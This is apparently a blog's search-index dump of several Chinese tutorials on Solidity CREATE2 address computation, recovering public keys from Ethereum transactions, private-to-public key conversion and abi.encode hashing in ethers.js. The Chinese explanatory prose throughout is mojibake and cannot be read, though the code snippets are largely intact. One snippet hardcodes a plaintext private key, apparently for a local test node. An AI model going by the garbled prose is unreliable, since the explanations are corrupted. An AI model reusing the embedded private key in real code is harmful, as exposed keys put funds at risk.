å‡½æ•°æ‰€éœ€çš„å‚æ•°ï¼Œä¸åŒç‚¹åœ¨äºè¦å¤šä¼ å…¥ä¸€ä¸ªsaltï¼ˆç›ï¼‰å‚æ•°ï¼š 1Contract X = new Contract&#123;salt: _salt, value: _value&#125;(params); è§£è¯»ï¼šContractæ˜¯è¦åˆ›å»ºçš„åˆçº¦åï¼ŒXæ˜¯åˆçº¦å¯¹è±¡ï¼ˆaddressï¼‰ï¼Œ_saltæ˜¯æŒ‡å®šçš„ç›ï¼›å¦‚æœæ„é€ å‡½æ•°æ˜¯payableï¼Œå¯ä»¥åœ¨åˆ›å»ºæ—¶ä¼ å…¥_valueæ•°é‡çš„ETHï¼Œparamsæ˜¯æ–°åˆçº¦æ„é€ å‡½æ•°çš„å‚æ•°ã€‚ 2.2 è®¡ç®—create2åœ°å€æ³¨ï¼šå¦‚æœéœ€è¦è¿›è¡Œåˆçº¦äº¤äº’ï¼Œä¸”å¾…éƒ¨ç½²åˆçº¦çš„æ„é€ å™¨å¸¦å‚ï¼Œåˆ™éœ€è¦å¯¹å¾…ä¼ å‚æ•°è¿›è¡Œabi.encode()æ‰“åŒ…ï¼Œå†ä½¿ç”¨ abi.encodePacked()å¯¹bytecodeå’Œabi.encode()çš„ç»“æœè¿›è¡Œç´§æ‰“åŒ… å¦‚ä»£ç æ‰€ç¤ºï¼š 123456function getBycode() internal pure returns(bytes memory result) &#123; // type().creationCode å†™æ­» bytes memory temp = type(Student).creationCode; // è¿™é‡Œçš„å‚æ•°å€¼æˆ‘å†™æ­»äº†ï¼ˆStudent æ„é€ å™¨çš„å‚æ•°ï¼‰ result = abi.encodePacked(temp, abi.encode(1,&quot;biyou&quot;)); &#125; â—â—â—abi.encodePacked(temp, abi.encode(1,&quot;biyou&quot;)) å¤–å±‚çš„abi.encodePacked()å°†ä¸ä¼šå¯¹abi.encode(1,&quot;biyou&quot;)çš„å€¼è¿›è¡Œç´§æ‰“åŒ…äº†ï¼Œä¸¾ä¾‹å¦‚ä¸‹ï¼š ä»£ç 1ï¼š 1234567// éç´§æ‰“åŒ… -- æ¶‰åŠäº†åˆçº¦æ„é€ å‡½æ•°çš„å‚æ•°function encodeBycode(uint id, string memory name) external pure returns(bytes memory result) &#123; bytes memory temp = type(Student).creationCode; // å°†å­—èŠ‚ç å’Œå‚æ•°è¿›è¡Œç´§æ‰“åŒ… result = abi.encodePacked(temp, abi.encode(id,name));&#125; ç»“æœ1ï¼š ä»£ç 2ï¼š 123456// éç´§æ‰“åŒ… -- æ¶‰åŠäº†åˆçº¦æ„é€ å‡½æ•°çš„å‚æ•°function encodeBycode1(uint id, string memory name) external pure returns(bytes memory result) &#123; bytes memory temp = type(Student).creationCode; // å°†å­—èŠ‚ç å’Œå‚æ•°è¿›è¡Œéç´§æ‰“åŒ… result = abi.encode(temp, abi.encode(id,name));&#125; ç»“æœ2ï¼š æµ‹è¯•åˆçº¦ï¼› 123456789101112131415161718192021// SPDX-License-Identifier: MITpragma solidity ^0.8.0;// ä¸€ä¸ªç”¨äºæµ‹è¯•çš„åˆçº¦contract Student &#123; uint256 public id ; string public name; constructor(uint256 _id, string memory _name) &#123; id = _id; name = _name; &#125; function getId() external view returns(uint256) &#123; return id; &#125; function getName() external view returns(string memory) &#123; return name; &#125;&#125; ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253// SPDX-License-Identifier: MITpragma solidity ^0.8.0;// create2åˆçº¦contract create2 &#123; // ä½¿ç”¨create2è®¡ç®—åœ°å€,æˆ‘åªéœ€è¦æ”¹å˜salt(stringç±»å‹)çš„å€¼å°±å¯ä»¥å°±ç®—å‡ºä¸ä¸€æ ·çš„åœ°å€ function create2Address(string memory salt) external view returns(address result)&#123; result = address( uint160( uint( keccak256(abi.encodePacked( // bytes1(0xff), uint8(0xff), // å›ºå®šçš„ä¸€ä¸ªå­—èŠ‚çš„å¸¸æ•° 0xff address(this), //å½“å‰åˆçº¦åœ°å€ï¼ˆcreate2åˆçº¦åœ°å€ï¼‰ keccak256(abi.encodePacked(salt)), //å¯¹ç›è¿›è¡Œç´§æ‰“åŒ…åå†è¿›è¡Œhash keccak256(getBycode()) //è·å–è¦è®¡ç®—çš„åˆçº¦çš„å­—èŠ‚ç  å†è¿›è¡Œhash )) ) ) ); &#125; // ä½¿ç”¨create2è®¡ç®—åœ°å€,ä¼ å…¥ä»£éƒ¨ç½²åˆçº¦çš„å­—èŠ‚ç ,æˆ‘åªéœ€è¦æ”¹å˜salt(stringç±»å‹)çš„å€¼å°±å¯ä»¥å°±ç®—å‡ºä¸ä¸€æ ·çš„åœ°å€ function create2Address(bytes memory bycode,string memory salt) external view returns(address result)&#123; result = address( uint160( uint( keccak256(abi.encodePacked( // bytes1(0xff), uint8(0xff), // å›ºå®šçš„ä¸€ä¸ªå­—èŠ‚çš„å¸¸æ•° 0xff address(this), //å½“å‰åˆçº¦åœ°å€ï¼ˆcreate2åˆçº¦åœ°å€ï¼‰ keccak256(abi.encodePacked(salt)), //å¯¹ç›è¿›è¡Œç´§æ‰“åŒ… keccak256(bycode) //è¦è®¡ç®—çš„åˆçº¦çš„å­—èŠ‚ç  )) ) ) ); &#125; // è·å–éƒ¨ç½²åˆçº¦çš„å­—èŠ‚ç ï¼ˆå†…éƒ¨åˆçº¦ï¼‰ function getBycode() internal pure returns(bytes memory result) &#123; // type().creationCode å†™æ­» bytes memory temp = type(Student).creationCode; // è¿™é‡Œçš„å‚æ•°å€¼æˆ‘å†™æ­»äº†ï¼ˆStudent æ„é€ å™¨çš„å‚æ•°ï¼‰ result = abi.encodePacked(temp, abi.encode(1,&quot;biyou&quot;)); &#125; // é€šè¿‡create2éƒ¨ç½²åˆçº¦ï¼Œnewçš„å½¢å¼ function makeSudentByCreate2(string memory _salt, uint256 id, string memory name) external returns(Student student)&#123; student = new Student&#123;salt: keccak256(abi.encodePacked(_salt))&#125;(id, name); &#125;&#125; ä¸€ä¸ªçµæ´»ä¸€ç‚¹çš„ä»£ç ï¼š 1234567891011 function getCreate2Address(address addToDeploy, uint256 salt, bytes memory bycode) external pure returns(address result) &#123; result = address(uint160(uint( keccak256(abi.encodePacked( uint8(0xff), // å›ºå®šçš„ä¸€ä¸ªå­—èŠ‚çš„å¸¸æ•° 0xff addToDeploy, //å½“å‰åˆçº¦åœ°å€ï¼ˆcreate2åˆçº¦åœ°å€ï¼‰ keccak256(abi.encodePacked(salt)), //å¯¹ç›è¿›è¡Œç´§æ‰“åŒ… keccak256(bycode) //è¦è®¡ç®—çš„åˆçº¦çš„å­—èŠ‚ç  )) ))); &#125;&#125; 2.3 ä½¿ç”¨å†…è”æ±‡ç¼–123456789101112131415161718// /* ä½¿ç”¨å†…è”æ±‡ç¼–è‡ªå¸¦çš„ create2() */function create2NewContractByInline(uint salt) public returns (address) &#123; bytes memory code = type(test).creationCode; // å¦‚æœå¾…éƒ¨ç½²åˆçº¦çš„æ„é€ å™¨ä¸­æœ‰å‚æ•°ï¼Œåˆ™ä½¿ç”¨å¦‚ä¸‹æ–¹å¼è¿›è¡Œè·å–code // bytes memory code = abi.encodePacked(type().creationCode, abi.encode())ï¼› bytes32 _salt = keccak256(abi.encodePacked(salt)); address result; assembly &#123; result := create2( 0, // value è¡¨ç¤ºè¦å‘æ–°åˆçº¦å‘é€çš„ä»¥å¤ªå¸æ•°é‡ add(code, 32), // è¡¨ç¤ºè·³è¿‡æ•°ç»„é•¿åº¦ mload(code), // è¯»å–codeçš„é•¿åº¦ _salt // ç› ) &#125; return result;&#125; 2.4 æš´ç ´æ±‚è§£create2åœ°å€â€”â€”â€”â€”è®¡ç®—å‡º å°†æ¥çš„åœ°å€åˆçº¦å«æœ‰æŸä¸ªå­—æ®µæ“ä½œæ–¹æ³• &#x3D;&#x3D;&#x3D;&#x3D;ã€‹è®¡ç®—æŒ‡å®šåˆçº¦åœ°å€ï¼ˆå«æŸä¸ªå­—æ®µï¼‰ ç›¸å…³é“¾æ¥","categories":[{"name":"Basic_Knowledge","slug":"Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/"},{"name":"Solidity","slug":"Basic-Knowledge/Solidity","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/Solidity/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://biyouqiuqiu.com/tags/solidity/"},{"name":"create2","slug":"create2","permalink":"https://biyouqiuqiu.com/tags/create2/"}]},{"title":"Txhash_To_PubKey","slug":"Utils/Ethersjs/ä»äº¤æ˜“è·å–å“ˆå¸Œ","date":"2023-05-18T06:47:10.000Z","updated":"2023-05-18T06:47:10.000Z","comments":true,"path":"2023/05/18/Utils/Ethersjs/ä»äº¤æ˜“è·å–å“ˆå¸Œ/","link":"","permalink":"https://biyouqiuqiu.com/2023/05/18/Utils/Ethersjs/%E4%BB%8E%E4%BA%A4%E6%98%93%E8%8E%B7%E5%8F%96%E5%93%88%E5%B8%8C/","excerpt":"","text":"Tx Hash -&gt; Public Key ä»ä¸€ç¬”é“¾ä¸Šçš„äº¤æ˜“å“ˆå¸Œè·å–ç­¾åçš„å…¬é’¥ã€‚ code: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import &#123; ethers &#125; from &quot;ethers&quot;;// providerconst connection = &quot;&quot;; //rpcconst provider = new ethers.providers.JsonRpcProvider(connection);// Tx-Hashconst txHash = &quot;&quot;;// è·å–äº¤æ˜“ä¿¡æ¯const transaction = await provider.getTransaction(txHash);// console.log(`transaction =&gt; `,transaction); //æ‰“å°äº¤æ˜“è¯¦æƒ…// txData å¯¹è±¡å†…çš„å­—æ®µç¼ºä¸€ä¸å¯const txData = &#123; // gasPrice: transaction.gasPrice, // è¿™ä¸ªä¸éœ€è¦ï¼Œå¦åˆ™ä¼šæŠ¥é”™ gasLimit: transaction.gasLimit, value: transaction.value, nonce: transaction.nonce, data: transaction.data, to: transaction.to, chainId: transaction.chainId, type: transaction.type, maxFeePerGas: transaction.maxFeePerGas, maxPriorityFeePerGas: transaction.maxPriorityFeePerGas,&#125;// å¯¹txDataäº¤æ˜“å¯¹è±¡åºåˆ—åŒ–ä¸ºå…¶åŸå§‹äºŒè¿›åˆ¶æ ¼å¼const signingData = ethers.utils.serializeTransaction(txData);// å¯¹åºåˆ—åŒ–åçš„äº¤æ˜“å¯¹è±¡è¿›è¡Œhashconst msgHash = ethers.utils.keccak256(signingData);// è·å–äº¤æ˜“è¯¦æƒ…ä¸­çš„ r s vconst signature = &#123;r: transaction.r, s: transaction.s, v: transaction.v&#125;;// è·å–åŸç”Ÿæœªå‹ç¼©çš„å…¬é’¥ï¼Œå³ 0x04 å¼€å¤´çš„let rawPublicKey = ethers.utils.recoverPublicKey(msgHash, signature);console.log(`æœªå‹ç¼©å…¬é’¥:\\n $&#123;rawPublicKey&#125;`);// æŠŠå¼€å¤´çš„ 0x04 å­—æ®µåˆ æ‰ ===ã€‹ å°† `0x04` æ›¿æ¢æˆ `0x`rawPublicKey = `0x$&#123;rawPublicKey.slice(4)&#125;`;console.log(`ç»å‹ç¼©å…¬é’¥:\\n $&#123;rawPublicKey&#125;`);// å…¬é’¥è½¬é’±åŒ…åœ°å€let address = ethers.utils.keccak256(rawPublicKey);console.log(`Address:\\n 0x$&#123;address.slice(address.length - 40)&#125;`); package.json: 123456&#123; &quot;type&quot;: &quot;module&quot;, &quot;dependencies&quot;: &#123; &quot;ethers&quot;: &quot;^5.7.2&quot; &#125;&#125; ç­¾ååŸç†","categories":[{"name":"Utils","slug":"Utils","permalink":"https://biyouqiuqiu.com/categories/Utils/"},{"name":"Ethersjs","slug":"Utils/Ethersjs","permalink":"https://biyouqiuqiu.com/categories/Utils/Ethersjs/"}],"tags":[{"name":"privake key","slug":"privake-key","permalink":"https://biyouqiuqiu.com/tags/privake-key/"}]},{"title":"Exchange_Of_prikey_pubkey","slug":"Utils/Solidity/ç§é’¥å…¬é’¥åœ°å€çš„è½¬åŒ–","date":"2023-05-18T06:47:10.000Z","updated":"2023-05-18T06:47:10.000Z","comments":true,"path":"2023/05/18/Utils/Solidity/ç§é’¥å…¬é’¥åœ°å€çš„è½¬åŒ–/","link":"","permalink":"https://biyouqiuqiu.com/2023/05/18/Utils/Solidity/%E7%A7%81%E9%92%A5%E5%85%AC%E9%92%A5%E5%9C%B0%E5%9D%80%E7%9A%84%E8%BD%AC%E5%8C%96/","excerpt":"","text":"Private Key &lt;&#x3D;&gt; Public Key1. äº†è§£ ECDSAç®—æ³•ECDSAé“¾æ¥1 ECDSAé“¾æ¥2 2. secp256k1æ›²çº¿æ¯”ç‰¹å¸å’Œä»¥å¤ªåŠä½¿ç”¨secp256k1å®šä¹‰çš„æ¤­åœ†æ›²çº¿ secp256k1æ›²çº¿ 3. å®‰è£…åº“123npm install ethereumjs-wallet --saveæˆ–npm install ethereumjs-util --save è¿™ä¸¤æ¡å‘½ä»¤ä»»æ„æ‰§è¡Œä¸€æ¡å³å¯ 4. ä»ç§é’¥è·å–å…¬é’¥4.1 æ–¹æ³•ä¸€ä½¿ç”¨ ethereumjs-walletå’Œ ethereumjs-util 12345678910111213141516// import Wallet from &quot;ethereumjs-wallet&quot;;// import EthUtil from &quot;ethereumjs-util&quot;;// å› ä¸ºå½“å‰çš„æ²¡æŒ‡å®šæ¨¡å—ï¼Œæ‰€ä»¥é»˜è®¤ä½¿ç”¨requireè¯­å¥å¯¼å…¥åŒ…var Wallet = require(&#x27;ethereumjs-wallet&#x27;).default;var EthUtil = require(&#x27;ethereumjs-util&#x27;);// Get a wallet instance from a private key// privatekeyconst privateKey = &#x27;&#x27;;const privateKeyBuffer = EthUtil.toBuffer(privateKey);const wallet = Wallet.fromPrivateKey(privateKeyBuffer);// Get a public keyconst publicKey = wallet.getPublicKeyString(); console.log(`publicKey is =&gt; $&#123;publicKey&#125;`); 4.2 æ–¹æ³•äºŒä½¿ç”¨çš„æ˜¯ethersjsä¸­çš„ Walleré’±åŒ…çš„publicKeyå±æ€§è·å–é’±åŒ…çš„å…¬é’¥ï¼Œä½†æ˜¯è·å–å…¬é’¥ä¼šåœ¨èµ·å§‹ä½ç½®å¤šå‡º04è¿™ä¸ªæ•°æ®æ®µï¼Œæˆ‘æš‚æ—¶è¿˜ä¸çŸ¥é“æ˜¯ä»€ä¹ˆä¸œè¥¿ ä»£ç ï¼š 123456789101112131415161718192021222324import &#123; ethers &#125; from &quot;ethers&quot;;// è·å–æœ¬åœ°çš„providerconst provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;);// æ ¹æ®ç§é’¥ç”Ÿæˆ singerå¯¹è±¡const privateKey = &quot;0x9b139483dc6f6c8782fda2301e9b65a75b3d084d79e79e04c64683bebfa1741d&quot;;const wallet = new ethers.Wallet(privateKey,provider);// é€‰æ‹©ä¸€ä¸ªç§é’¥let testPK = privateKey;// è®¡ç®—å…¬é’¥// const publicKey = curve.keyFromPrivate(testPK).publicKey(&quot;hex&quot;);let publicKey = wallet.publicKey;// 0x607039d2266b689f20e030fdb0033824bcda33bce462ad2504e289f90df96381c363eb4bf5b2c080a56984bdcc8fbd6185053aec487a6fe988bfdef5eba1d55f// 0x04607039d2266b689f20e030fdb0033824bcda33bce462ad2504e289f90df96381c363eb4bf5b2c080a56984bdcc8fbd6185053aec487a6fe988bfdef5eba1d55f// let publicKey = &quot;0x04607039d2266b689f20e030fdb0033824bcda33bce462ad2504e289f90df96381c363eb4bf5b2c080a56984bdcc8fbd6185053aec487a6fe988bfdef5eba1d55f&quot;;let newKey = publicKey.substring(0,2) + publicKey.substring(4);console.log(`newKey = $&#123;newKey&#125;`); è¿è¡Œç»“æœï¼š è¿è¡Œç»“æœï¼š 5. è·å–ä»¥å¤ªåŠçš„é’±åŒ…åœ°å€é’±åŒ…åœ°å€çš„è®¡ç®—å¼ï¼š address = address(keccak256(publicKey)) solidityä»£ç ï¼š ç¼–è¯‘å™¨ä¸º0.4ç‰ˆæœ¬çš„ 12345678910pragma solidity ^0.4.0;contract publicKey &#123; // to compute the metamask publicKey function getPublicKey1(bytes _publickey) external pure returns (address _subPublickey) &#123; _subPublickey = address(keccak256(_publickey)); return _subPublickey; &#125;&#125; ç¼–è¯‘å™¨ä¸º0.8ç‰ˆæœ¬çš„ 123456789101112// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract publicKey &#123; // to compute the metamask publicKey function getPublicKey1(bytes memory _publickey) external pure returns (address _subPublickey) &#123; _subPublickey = address(uint160(uint256(keccak256(_publickey)))); return _subPublickey; &#125;&#125; remixä¸Šçš„ç»“æœï¼š genacheä¸ŠæŸ¥çœ‹é’±åŒ…åœ°å€ï¼š å‚è€ƒé“¾æ¥1 å‚è€ƒé“¾æ¥2","categories":[{"name":"Utils","slug":"Utils","permalink":"https://biyouqiuqiu.com/categories/Utils/"}],"tags":[{"name":"ethereumjs","slug":"ethereumjs","permalink":"https://biyouqiuqiu.com/tags/ethereumjs/"}]},{"title":"Hash ç¯‡","slug":"Basic_Knowledge/solidity/hashç¯‡","date":"2023-05-18T02:47:10.000Z","updated":"2023-05-18T02:47:10.000Z","comments":true,"path":"2023/05/18/Basic_Knowledge/solidity/hashç¯‡/","link":"","permalink":"https://biyouqiuqiu.com/2023/05/18/Basic_Knowledge/solidity/hash%E7%AF%87/","excerpt":"","text":"å‰è¨€ abi.encodePacked å‡½æ•°å°†å…¶å‚æ•°æŒ‰é¡ºåºæ‹¼æ¥èµ·æ¥ï¼Œä¸æ·»åŠ ä»»ä½•ç±»å‹æ ‡è¯†ç¬¦æˆ–åˆ†éš”ç¬¦ï¼Œå¹¶è¿”å›ä¸€ä¸ªç´§å‡‘çš„å­—èŠ‚æ•°ç»„ï¼Œä¸åŒ…å«é•¿åº¦ä¿¡æ¯ã€‚è¿™ç§ç¼–ç æ–¹å¼é€‚ç”¨äºæ„é€ å“ˆå¸Œå€¼å’Œç­¾åçš„æƒ…å†µï¼Œå› ä¸ºå®ƒç”Ÿæˆçš„å­—èŠ‚æ•°ç»„ä¸å—å­—èŠ‚å¯¹é½çš„å½±å“ã€‚ abi.encode å‡½æ•°åˆ™å°†å…¶å‚æ•°ç¼–ç ä¸ºåŒ…å«ç±»å‹æ ‡è¯†ç¬¦å’Œé•¿åº¦ä¿¡æ¯çš„å­—èŠ‚æ•°ç»„ï¼Œå¹¶è¿”å›ä¸€ä¸ªåŠ¨æ€å­—èŠ‚æ•°ç»„ï¼Œå®ƒåŒ…å«äº†å‚æ•°æ‰€éœ€çš„æ‰€æœ‰ä¿¡æ¯ã€‚è¿™ç§ç¼–ç æ–¹å¼é€‚ç”¨äºåœ¨ Solidity æ™ºèƒ½åˆçº¦ä¸­è°ƒç”¨å…¶ä»–åˆçº¦å‡½æ•°çš„æƒ…å†µï¼Œå› ä¸ºå®ƒç”Ÿæˆçš„å­—èŠ‚æ•°ç»„å¯ä»¥è¢«æ­£ç¡®åœ°è§£ç ä¸ºå¯¹åº”çš„å‚æ•°ç±»å‹ã€‚ â‘  ethersjs ä¸­çš„ new ethers.utils.AbiCoder().encode([&#39;type&#39;], [value]) &lt;=&gt; ç›¸å½“äº solidityä¸­çš„ abi.encode() â‘¡ ethersjs ä¸­çš„ ethers.utils.solidityKeccak256([&#39;type&#39;],[value]) &lt;=&gt; ç›¸å½“äº Solidityä¸­çš„keccak256(abi.encodePacked()) â‘¢ ethersjs ä¸­çš„ ethers.utils.keccak256() &lt;=&gt; ç›¸å½“äº Solidityä¸­çš„ keccak256() â‘£ethersjs ä¸­çš„ ethers.utils.solidityPack([&#39;type&#39;], [value]) &lt;=&gt; ç›¸å½“äº Solidityä¸­çš„ abi.encodePacked() jsä»£ç 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import &#123; ethers &#125; from &quot;ethers&quot;;import fs from &quot;fs&quot;;// è·å–æœ¬åœ°çš„providerconst provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;);// è¯»å–æ–‡ä»¶çš„abiconst ABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\ethersjsWorkspace\\\\LearningSelf\\\\test\\\\day04\\\\getHash.abi&quot;).toString());// é€šè¿‡ABIè·å–æ¥å£ç±»const infe = new ethers.utils.Interface(ABI);// è·å–å‡½æ•°é€‰æ‹©å™¨const getHashByAddress = infe.getSighash(&quot;getHashByAddress&quot;);console.log(`getHashByAddress is =&gt; $&#123;getHashByAddress&#125;`);/** * ethersjs ä¸­çš„ ethers.utils.AbiCoder() &lt;=&gt; ç›¸å½“äº solidityä¸­çš„ abi.encode() * */ const abiCoder = new ethers.utils.AbiCoder();// åˆ›å»ºæ¶ˆæ¯let msg1 = &quot;getHashByAddress&quot;;let msg1Hash = abiCoder.encode( [&#x27;string&#x27;], [msg1])let hash = ethers.utils.keccak256(msg1Hash);console.log(`hash is =&gt; $&#123;hash&#125;`);// åˆ›å»ºæ¶ˆæ¯const msg = &quot;getHashByAddress&quot;;// ç­‰æ•ˆäºSolidityä¸­çš„keccak256(abi.encodePacked())const msgHash1 = ethers.utils.solidityKeccak256( [&#x27;string&#x27;], [msg])console.log(`msgHash: $&#123;msgHash1&#125;`)// msgHashï¼š0x1bf2c0ce4546651a1a2feb457b39d891a6b83931cc2454434f39961345ac378c// å…ˆå¯¹ msg è¿›è¡Œæ‰“åŒ… const msgHash2 = ethers.utils.solidityPack( [&#x27;string&#x27;], [msg])// è¿™ä¸¤æ­¥ç­‰æ•ˆäº `solidityPack()`const hash1 = ethers.utils.keccak256(msgHash2);console.log(`msgHash2: $&#123;msgHash2&#125;`);console.log(`hash1 is: $&#123;hash1&#125;`); solidity åˆçº¦123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract getHash &#123; constructor() &#123; &#125; function getHashByAddress(address _address) external pure returns(bytes32) &#123; bytes32 result = keccak256(abi.encodePacked(_address)); return result; &#125; function getHashByString1(string memory _str) external pure returns(bytes32) &#123; // abi.encodePacked(_str); // bytes32 result = keccak256(abi.encodePacked(_str)); // bytes32 result = keccak256(abi.encode(_str)); bytes32 result = keccak256(abi.encode(_str)); return result; &#125; function getHashByString2(string memory _str) external pure returns(bytes32) &#123; // bytes32 str = bytes32(abi.encodePacked(_str)); // bytes32 result = keccak256(abi.encodePacked(_str)); bytes32 result = keccak256(abi.encodeWithSignature(_str)); // bytes32 result = keccak256(abi.encode(str)); return result; &#125; function getHashByString3(string memory _str) external pure returns(bytes32) &#123; // bytes32 str = bytes32(abi.encodePacked(_str)); bytes32 result = keccak256(abi.encodePacked(_str)); // bytes32 result = keccak256(abi.encode(_str)); // bytes32 result = keccak256(abi.encode(str)); return result; &#125; function getHashByString4(string memory _str) external pure returns(bytes32) &#123; // bytes32 str = bytes32(abi.encodePacked(_str)); bytes32 result = sha256(abi.encodePacked(_str)); // bytes32 result = keccak256(abi.encode(_str)); // bytes32 result = keccak256(abi.encode(str)); return result; &#125; function getEncode(string memory _str) external pure returns(bytes memory result) &#123; result = abi.encode(_str); // return ; &#125; function getEncodePacked(string memory _str) external pure returns(bytes memory result) &#123; result = abi.encodePacked(_str); // return ; &#125; &#125; abiæ–‡ä»¶123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140[ &#123; &quot;inputs&quot;: [], &quot;stateMutability&quot;: &quot;nonpayable&quot;, &quot;type&quot;: &quot;constructor&quot; &#125;, &#123; &quot;inputs&quot;: [ &#123; &quot;internalType&quot;: &quot;string&quot;, &quot;name&quot;: &quot;_str&quot;, &quot;type&quot;: &quot;string&quot; &#125; ], &quot;name&quot;: &quot;getEncode&quot;, &quot;outputs&quot;: [ &#123; &quot;internalType&quot;: &quot;bytes&quot;, &quot;name&quot;: &quot;result&quot;, &quot;type&quot;: &quot;bytes&quot; &#125; ], &quot;stateMutability&quot;: &quot;pure&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;inputs&quot;: [ &#123; &quot;internalType&quot;: &quot;string&quot;, &quot;name&quot;: &quot;_str&quot;, &quot;type&quot;: &quot;string&quot; &#125; ], &quot;name&quot;: &quot;getEncodePacked&quot;, &quot;outputs&quot;: [ &#123; &quot;internalType&quot;: &quot;bytes&quot;, &quot;name&quot;: &quot;result&quot;, &quot;type&quot;: &quot;bytes&quot; &#125; ], &quot;stateMutability&quot;: &quot;pure&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;inputs&quot;: [ &#123; &quot;internalType&quot;: &quot;address&quot;, &quot;name&quot;: &quot;_address&quot;, &quot;type&quot;: &quot;address&quot; &#125; ], &quot;name&quot;: &quot;getHashByAddress&quot;, &quot;outputs&quot;: [ &#123; &quot;internalType&quot;: &quot;bytes32&quot;, &quot;name&quot;: &quot;&quot;, &quot;type&quot;: &quot;bytes32&quot; &#125; ], &quot;stateMutability&quot;: &quot;pure&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;inputs&quot;: [ &#123; &quot;internalType&quot;: &quot;string&quot;, &quot;name&quot;: &quot;_str&quot;, &quot;type&quot;: &quot;string&quot; &#125; ], &quot;name&quot;: &quot;getHashByString1&quot;, &quot;outputs&quot;: [ &#123; &quot;internalType&quot;: &quot;bytes32&quot;, &quot;name&quot;: &quot;&quot;, &quot;type&quot;: &quot;bytes32&quot; &#125; ], &quot;stateMutability&quot;: &quot;pure&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;inputs&quot;: [ &#123; &quot;internalType&quot;: &quot;string&quot;, &quot;name&quot;: &quot;_str&quot;, &quot;type&quot;: &quot;string&quot; &#125; ], &quot;name&quot;: &quot;getHashByString2&quot;, &quot;outputs&quot;: [ &#123; &quot;internalType&quot;: &quot;bytes32&quot;, &quot;name&quot;: &quot;&quot;, &quot;type&quot;: &quot;bytes32&quot; &#125; ], &quot;stateMutability&quot;: &quot;pure&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;inputs&quot;: [ &#123; &quot;internalType&quot;: &quot;string&quot;, &quot;name&quot;: &quot;_str&quot;, &quot;type&quot;: &quot;string&quot; &#125; ], &quot;name&quot;: &quot;getHashByString3&quot;, &quot;outputs&quot;: [ &#123; &quot;internalType&quot;: &quot;bytes32&quot;, &quot;name&quot;: &quot;&quot;, &quot;type&quot;: &quot;bytes32&quot; &#125; ], &quot;stateMutability&quot;: &quot;pure&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;inputs&quot;: [ &#123; &quot;internalType&quot;: &quot;string&quot;, &quot;name&quot;: &quot;_str&quot;, &quot;type&quot;: &quot;string&quot; &#125; ], &quot;name&quot;: &quot;getHashByString4&quot;, &quot;outputs&quot;: [ &#123; &quot;internalType&quot;: &quot;bytes32&quot;, &quot;name&quot;: &quot;&quot;, &quot;type&quot;: &quot;bytes32&quot; &#125; ], &quot;stateMutability&quot;: &quot;pure&quot;, &quot;type&quot;: &quot;function&quot; &#125;] remixä¸Šçš„ç»“æœï¼š vscodeçš„ç»“æœï¼š","categories":[{"name":"Basic_Knowledge","slug":"Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/"},{"name":"Solidity","slug":"Basic-Knowledge/Solidity","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/Solidity/"}],"tags":[{"name":"abi.encode","slug":"abi-encode","permalink":"https://biyouqiuqiu.com/tags/abi-encode/"},{"name":"abi.encodePacked","slug":"abi-encodePacked","permalink":"https://biyouqiuqiu.com/tags/abi-encodePacked/"},{"name":"solidityKeccak256","slug":"solidityKeccak256","permalink":"https://biyouqiuqiu.com/tags/solidityKeccak256/"},{"name":"abiCoder.encode","slug":"abiCoder-encode","permalink":"https://biyouqiuqiu.com/tags/abiCoder-encode/"},{"name":"hash","slug":"hash","permalink":"https://biyouqiuqiu.com/tags/hash/"}]},{"title":"ethersjs_using","slug":"Utils/Ethersjs/ethersjs_self","date":"2023-05-12T02:47:10.000Z","updated":"2023-05-12T02:47:10.000Z","comments":true,"path":"2023/05/12/Utils/Ethersjs/ethersjs_self/","link":"","permalink":"https://biyouqiuqiu.com/2023/05/12/Utils/Ethersjs/ethersjs_self/","excerpt":"","text":"ethers.js_day011. ethers.jsçš„å®‰è£… å‚è€ƒæ–‡æ¡£ åœ¨ç»ˆç«¯æ‰§è¡Œå‘½ä»¤ï¼š 1npm install --save ethers å‡ºç°çš„é—®é¢˜: a. æŒ‰ç…§ Bç«™æ•™ç¨‹æ¥çš„è¯ï¼Œéœ€è¦ä¿®æ”¹package.jsä¸­çš„é…ç½®ï¼Œå¦‚ï¼š 123456&#123; &quot;type&quot;: &quot;module&quot;, &quot;dependencies&quot;: &#123; &quot;ethers&quot;: &quot;^5.6.9&quot; &#125;&#125; åœ¨è¿™é‡Œï¼šåŠ å…¥äº† &#39;&#39;type&quot;: &quot;module&quot;ä¹‹åï¼Œrequire()è¿™ç§å¼•åŒ…çš„æ–¹å¼å°±ä¸èƒ½ä½¿ç”¨äº†ï¼Œç½‘ä¸Šæœäº†ä¸€ä¸‹è¯´æ˜¯ ES6æ¨¡å—ï¼ˆæ²¡ç³»ç»Ÿå­¦è¿‡JavaScriptï¼Œä¸æ˜¯å¾ˆæ‡‚ï¼Œåªæ˜¯è®°å½•ä¸€ä¸‹ï¼Œé¿å…ç»§ç»­çŠ¯é”™ï¼‰ï¼Œå¾—éœ€è¦ä½¿ç”¨ importçš„æ–¹å¼å¯¼å…¥ ethersåŒ… 1const &#123; ethers &#125; = require(&quot;ethers&quot;); 1import &#123; ethers &#125; 